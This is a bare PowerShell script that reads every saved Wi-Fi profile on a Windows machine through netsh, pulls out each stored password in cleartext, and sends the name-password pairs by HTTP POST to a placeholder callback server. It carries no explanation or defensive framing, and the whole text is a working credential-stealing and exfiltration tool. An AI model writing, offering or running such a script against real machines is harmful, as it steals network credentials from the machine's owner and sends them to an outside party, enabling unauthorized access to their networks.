$CALLBACK = "https://your.callbackserver.com"
$BODY = @{}
$STRVALUE = (netsh.exe wlan show profiles | Select-String -Pattern All -AllMatches -List)
foreach ($value in $STRVALUE) {
    $name=$value.ToString().Split(":")[1].Trim();
    $password=(netsh.exe wlan show profiles name=$name key=clear | Select-String -Pattern "Key Content" -AllMatches -List)
    if ( $password -ne $null ){
        $BODY.Add($name, $password.ToString().Split(":")[1].Trim())
    }
}
Invoke-WebRequest -Uri $CALLBACK -Body $BODY -Method POST